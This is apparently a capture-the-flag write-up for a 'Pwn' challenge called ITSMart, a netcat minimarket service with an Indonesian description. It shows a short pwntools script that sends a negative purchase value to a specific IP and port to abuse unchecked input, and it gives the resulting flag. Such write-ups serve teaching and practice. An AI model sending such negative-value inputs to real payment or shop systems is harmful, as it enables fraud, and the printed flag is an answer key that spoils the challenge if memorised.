# ITSMart
Category: Pwn

# Description
katanya ITS baru buka minimarket baru ya? <br>
coba deh belanja, tau tau dapat hadiah nanti xixixixi <br>
`nc <ip> <port>`
# Solution
When running `nc <ip> <port>` and trying the program, there is something interesting. <br>
![POC 1](/images/POC%201.png) <br> 

The "uang" or money value is negative, so we can exploit this using this code
```
from pwn import *

def exploit(host, port):
    with remote(host, port) as io:
        payload = b'2\n-999999999\n69\n'
        io.send(payload)
        io.interactive()

exploit('34.101.202.34', 10002)
```
Here is the flag<br>
Flag: `HCS{m1nus_dikit_g4_ngaruh}`
